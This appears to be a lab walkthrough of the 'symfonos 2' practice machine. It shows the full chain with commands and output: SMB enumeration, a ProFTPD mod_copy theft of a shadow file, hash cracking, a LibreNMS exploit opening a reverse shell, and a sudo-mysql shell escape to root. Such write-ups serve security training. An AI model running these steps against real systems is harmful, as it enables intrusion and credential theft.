@@ -1,0 +1,302 @@
+I"g<p>This is the second machine of the series symfonos created by <strong>zayotic</strong>, an intermediate real-life based machine similar to OSCP designed to teach the importance of understanding a vulnerability.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>With netdiscover we start by locating our target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24 
+ Currently scanning: Finished!   |   Screen View: Unique Hosts  
+                                                              
+ 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222  
+ _________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
+ <span class="nt">-------------------------------------------------------------------------</span>
+ 192.168.179.136 00:0c:29:35:84:08      3     180  VMware, Inc. 
+ 192.168.179.254 00:50:56:e4:fa:35      1      42  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Our identified target, I proceed to perform a TCP port scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-p-</span> <span class="nt">-T5</span> 192.168.179.136 <span class="nt">-oG</span> nmap-tcp-all-ports.txt
+...
+PORT    STATE SERVICE      REASON
+21/tcp  open  ftp          syn-ack ttl 64
+22/tcp  open  ssh          syn-ack ttl 64
+80/tcp  open  http         syn-ack ttl 64
+139/tcp open  netbios-ssn  syn-ack ttl 64
+445/tcp open  microsoft-ds syn-ack ttl 64
+MAC Address: 00:0C:29:35:84:08 <span class="o">(</span>VMware<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>Then I perform a service enumeration of the open TCP ports with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p21</span>,22,80,139,445 192.168.179.136 <span class="nt">-oG</span> tcp-service-enum.txt
+...
+PORT    STATE SERVICE     REASON         VERSION                                                                                                                   
+21/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.3.5                                                                                                             
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                                             
+| ssh-hostkey:                                                                                                                                                     
+|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Cvyjh+QnQHsoZt3FqnW8JazNn1CYvc7uuArLkDPM25xV8l4Jc7Xw9InhmSFKJJD0mXhLALt/9byLeH7CyBEjpKATbSsEIL1iQ7G7ETmuOdZPfZxRnLhmaf1cv
+UxLapJQ5B3z67VR0PxvjfDk/0ARPAhKu1CuPmZk/y4t2iu8RKHG86j5jzR0KO3o2Aqsb2j+7XOd4IDCSFuoFiP3Eic/Jydtv73pyo+2JxBUvTSLaEtqe1op8sLP8wBFRX4Tvmqz/6zO1/zivBjBph8XMlzuMkMC8la8
+/XJmPb8U5C/8zfogG+YwycTw6ul7616PIj2ogPP89uyrTX9dM3RuZ9/1                                                                                                           
+|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                    
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXypIGuum1SlMddq/BrUwIZM1sRIgbzdijCa1zYunAAT+uKTwPGaKO7e9RxYu97+ygLgpuRMthojpUlOgOVGOA<span class="o">=</span> 
+|   256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                  
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILluhq57UWA4q/mo/h6CjqWMpMOYB9VjtvBrHc6JsEGk                                                                                 
+80/tcp  open  http        syn-ack ttl 64 WebFS httpd 1.21                                                                                                          
+| http-methods:                                                                                                                                                    
+|_  Supported Methods: GET HEAD                                                                                                                                    
+|_http-server-header: webfs/1.21                                                                                                                                   
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).                                                                                                               
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                               
+445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+...
+</span></code></pre></div></div>
+
+<h3 id="samba-enumeration">Samba Enumeration</h3>
+<p>Later I enumerate the samba service and find the <strong>anonymous</strong> shared folder and the <strong>aeolus</strong> and <strong>cronus</strong> users, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.136
+...
+ <span class="o">============================================</span> 
+|    Share Enumeration on 192.168.179.136    |
+ <span class="o">============================================</span> 
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        anonymous       Disk      
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>Samba 4.5.16-Debian<span class="o">)</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+
+<span class="o">[</span>+] Attempting to map shares on 192.168.179.136
+//192.168.179.136/print<span class="nv">$ </span>       Mapping: DENIED, Listing: N/A
+//192.168.179.136/anonymous     Mapping: OK, Listing: OK
+//192.168.179.136/IPC<span class="nv">$ </span> <span class="o">[</span>E] Can<span class="s1">'t understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+...
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\aeolus (Local User)
+S-1-22-1-1001 Unix User\cronus (Local User)
+</span></code></pre></div></div>
+<p>Then I log in to the anonymous shared folder with a null session, I find the <strong>backups</strong> folder and it contains a <strong>log.txt</strong> file, I download it to check what it may contain.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>smbclient //192.168.179.136/anonymous <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>      
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Thu Jul 18 09:30:09 2019
+  ..                                  D        0  Thu Jul 18 09:29:08 2019
+  backups                             D        0  Thu Jul 18 09:25:17 2019
+
+                19728000 blocks of size 1024. 16313728 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>backups
+smb: <span class="se">\b</span>ackups<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Thu Jul 18 09:25:17 2019
+  ..                                  D        0  Thu Jul 18 09:30:09 2019
+  log.txt                             N    11394  Thu Jul 18 09:25:16 2019
+
+                19728000 blocks of size 1024. 16313728 blocks available
+smb: <span class="se">\b</span>ackups<span class="se">\&gt;</span> get log.txt
+getting file <span class="se">\b</span>ackups<span class="se">\l</span>og.txt of size 11394 as log.txt <span class="o">(</span>247.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 247.3 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\b</span>ackups<span class="se">\&gt;</span> quit
+</code></pre></div></div>
+<p>The <strong>log.txt</strong> file contains the command for a copy of the shadow file, the configuration of the samba and proftpd services, with this we can outline our next attack vector.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span><span class="nb">cat </span>log.txt
+root@symfonos2:~# <span class="nb">cat</span> /etc/shadow <span class="o">&gt;</span> /var/backups/shadow.bak
+root@symfonos2:~# <span class="nb">cat</span> /etc/samba/smb.conf
+...
+<span class="o">[</span>anonymous]
+   path <span class="o">=</span> /home/aeolus/share
+   browseable <span class="o">=</span> <span class="nb">yes
+   read </span>only <span class="o">=</span> <span class="nb">yes
+   </span>guest ok <span class="o">=</span> <span class="nb">yes</span>
+   ...
+root@symfonos2:~# <span class="nb">cat</span> /usr/local/etc/proftpd.conf
+<span class="c"># Port 21 is the standard FTP port.</span>
+Port                            21
+...
+<span class="c"># Set the user and group under which the server will run.</span>
+User                            aeolus
+Group                           aeolus
+
+...
+<span class="c"># A basic anonymous configuration, no upload directories.  If you do not</span>
+<span class="c"># want anonymous users, simply delete this entire &lt;Anonymous&gt; section.</span>
+&lt;Anonymous ~ftp&gt;
+  User                          ftp
+  Group                         ftp
+
+</code></pre></div></div>
+
+<h3 id="proftpd-enumeration">ProFTPD Enumeration</h3>
+<p>If we notice the version of the ProFTPD service is vulnerable to <strong>File Copy</strong>, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>searchsploit ProFTPD 1.3.5    
+<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+ Exploit Title                                                               |  Path
+<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                    | linux/remote/37262.rb
+ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Remote Command Execution                          | linux/remote/36803.py
+ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Remote Command Execution <span class="o">(</span>2<span class="o">)</span>                      | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                    | linux/remote/36742.txt
+<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="proftpd-service">ProFTPD Service</h3>
+<p>Taking advantage of the fact that we can copy files via ftp, we will try to copy the <strong>shadow.back</strong> file to the samba <strong>share</strong> directory of aeolus, to later download this file to the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>nc 192.168.179.136 21                    
+220 ProFTPD 1.3.5 Server <span class="o">(</span>ProFTPD Default Installation<span class="o">)</span> <span class="o">[</span>192.168.179.136]
+SITE CPFR /var/backups/shadow.bak
+350 File or directory exists, ready <span class="k">for </span>destination name
+SITE CPTO /home/aeolus/share/shadow.back
+250 Copy successful
+quit
+221 Goodbye.
+root@kali:~/symfonos2<span class="nv">$ </span>smbclient //192.168.179.136/anonymous <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> get shadow.back
+getting file <span class="se">\s</span>hadow.back of size 1173 as shadow.back <span class="o">(</span>54.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 54.5 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> quit
+</code></pre></div></div>
+<p>After the <strong>shadow.back</strong> file has been downloaded, I filtered the password hashes to the systemHashes.txt file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\$6[^:]*'</span> shadow.back <span class="o">&gt;</span> systemHashes.txt
+</code></pre></div></div>
+<p>Then I proceed to crack the password hashes and after a few minutes I had the password <strong>sergioteamo</strong> for the <strong>aeolus</strong> user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> wordlist.txt
+root@kali:~/symfonos2<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 1800 systemHashes.txt wordlist.txt
+...
+<span class="nv">$6$dgjUjE</span>.Y<span class="nv">$G</span>.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo
+...
+</code></pre></div></div>
+
+<h3 id="login-via-ssh">Login via SSH</h3>
+<p>Later I log in to the ssh service with the username <strong>aeolus</strong> and tha password <strong>sergioteamo</strong>.</p>
+
+<p>listing the local services I realize that other services are running locally, port 8080 is possibly a web server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>ssh aeolus@192.168.179.136
+aeolus@192.168.179.136<span class="s1">'s password: 
+aeolus@symfonos2:~$ whoami
+aeolus
+aeolus@symfonos2:~$ uname -a
+Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux
+aeolus@symfonos2:~$ ss -antl
+State       Recv-Q Send-Q                Local Address:Port                       Peer Address:Port
+LISTEN      0      80                        127.0.0.1:3306                                  *:* 
+LISTEN      0      50                                *:139                                   *:* 
+LISTEN      0      128                       127.0.0.1:8080                                  *:* 
+LISTEN      0      32                                *:21                                    *:* 
+LISTEN      0      128                               *:22                                    *:* 
+LISTEN      0      20                        127.0.0.1:25                                    *:* 
+LISTEN      0      50                                *:445                                   *:* 
+LISTEN      0      50                               :::139                                  :::* 
+LISTEN      0      64                               :::80                                   :::* 
+LISTEN      0      128                              :::22                                   :::* 
+LISTEN      0      20                              ::1:25                                   :::* 
+LISTEN      0      50                               :::445                                  :::*
+</span></code></pre></div></div>
+
+<h3 id="local-port-forwarding">Local Port Forwarding</h3>
+<p>To comprobe what is really running on this port I did ssh port forwarding to be able to access this service, notice that port 4444 is listening on our attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>ssh <span class="nt">-L</span> 4444:127.0.0.1:8080 aeolus@192.168.179.136 <span class="nt">-N</span> 
+aeolus@192.168.179.136<span class="s1">'s password:
+
+root@kali:~/symfonos2$ ss -antl | grep 4444
+LISTEN 0      128        127.0.0.1:4444      0.0.0.0:*    
+LISTEN 0      128            [::1]:4444         [::]:*
+</span></code></pre></div></div>
+
+<p>Using the web browser I explore the service and come across a login page, I try to log in with the same credentials that I used when I logged into the ssh service.</p>
+
+<p><strong>username:</strong> aeolus
+<strong>password:</strong> sergioteamo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:4444/login
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos2/screenshot-1.png" alt="" /></p>
+
+<p><img src="/assets/images/symfonos2/screenshot-2.png" alt="" /></p>
+
+<p>After logging into the web page I found a vulnerability for this version of <strong>LibreNMS</strong>, a Remote Code Execution.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>searchsploit librenms
+<span class="nt">-----------------------------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
+ Exploit Title                                                                           |  Path
+<span class="nt">-----------------------------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
+LibreNMS - addhost Command Injection <span class="o">(</span>Metasploit<span class="o">)</span>                                        | linux/remote/46970.rb
+LibreNMS - Collectd Command Injection <span class="o">(</span>Metasploit<span class="o">)</span>                                       | linux/remote/47375.rb
+LibreNMS 1.46 - <span class="s1">'addhost'</span> Remote Code Execution                                          | php/webapps/47044.py
+LibreNMS 1.46 - <span class="s1">'search'</span> SQL Injection                                                   | multiple/webapps/48453.txt
+LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection                         | multiple/webapps/49246.py
+<span class="nt">-----------------------------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
+</code></pre></div></div>
+<p>Then I copy the python exploit to my current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/47044.py
+</code></pre></div></div>
+<p>To execute this exploit we need the cookie value, so we intercept the request with burpsuite ones we have logged in, as shown below:</p>
+
+<p><img src="/assets/images/symfonos2/screenshot-3.png" alt="" /></p>
+
+<p>Then we set up a netcat listener, we run the exploit and get a reverse shell with the cronos user privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>python 47044.py http://127.0.0.1:4444 <span class="s2">"XSRF-TOKEN=eyJpdiI6Im5qelNNcTM4MzdFUGIwRENITXl6WFE9PSIsInZhbHVlIjoic2p5Ynd0Z3dFYnI0aHF3RW9EZkRSZjZVcktjRFRGK3BCRzZWK1hmcEFBVDcrN3VXa29QQkxBQ2EwSlhnR3gyc0krR3hMMDVNbHFramdYQ0VqTTErOFE9PSIsIm1hYyI6ImNkNjA3MTdjZjlhNjVjZDBhYzViMGVjNDUyOWQwYTM5ODFjZTM1NzY0YWNkYzhmNzcxYjdiNTZhYmI3ZTYxMWIifQ%3D%3D; librenms_session=eyJpdiI6IlFTa0FXbEk4bEFGUmk4QVJieURjNFE9PSIsInZhbHVlIjoiXC9tYk9xYWtNUkx4eXdHRldKOWdqdGFQNms5WVwvOFdiUzhYVTJPajNoQ2poZzVtVW1QaE8yQkQwYXpESWYrY0hhVDNnS29DZVlHcGc4SHczbXlCa3NSUT09IiwibWFjIjoiODQ0ZTM5YWMyOGJhMDhhOWRhNTQ1MjQyNmZlY2Y4N2EzNWViNGNmZmM5NWZlZTlmZTg2NDBmNDVhZTI5MWVkMCJ9; PHPSESSID=l1gcq7e0u3q4bt5qm79b6n2b92"</span> 192.168.179.1 1337  
+<span class="o">[</span>+] Device Created Sucssfully
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos2<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.136] 36538
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ id
+uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
+$ uname -a
+Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux
+$ python -c '</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
+cronus@symfonos2:/opt/librenms$ 
+</span></code></pre></div></div>
+
+<p><strong>MySQL Credentials</strong></p>
+
+<p>Enumerating a little bit I find the MySQL access credentials from LibreNMS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cronus@symfonos2:/opt/librenms<span class="nv">$ </span><span class="nb">head </span>config.php
+&lt;?php
+<span class="c">## Have a look in defaults.inc.php for examples of settings you can set here. DO NOT EDIT defaults.inc.php!</span>
+
+<span class="c">### Database config</span>
+<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_host'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_port'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'3306'</span><span class="p">;</span>
+<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_user'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'librenms'</span><span class="p">;</span>
+<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_pass'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'VLby8dGg4rvw33sg'</span><span class="p">;</span>
+<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_name'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'librenms'</span><span class="p">;</span>
+<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_socket'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="mysql-sudo-rights">MySQL Sudo Rights</h3>
+<p>Checking the sudo permissions for the current user I find that the mysql binary is possible run it as sudo without password, to escalate privileges we just log in to mysql with the credentials <strong>librenms:VLby8dGg4rvw33sg</strong> and abuse the mysql feature of executing commands, so we invoke a hash and get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cronus@symfonos2:/opt/librenms/html<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                       
+Matching Defaults entries <span class="k">for </span>cronus on symfonos2:                                                                                                                 
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin                                                         
+                                                                                                                                                                   
+User cronus may run the following commands on symfonos2:                                                                                                           
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/mysql
+
+cronus@symfonos2:/opt/librenms/html<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/mysql <span class="nt">-u</span> librenms <span class="nt">-p</span>              
+Enter password: VLby8dGg4rvw33sg
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> <span class="se">\!</span> bash
+root@symfonos2:/opt/librenms/html# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+:ET
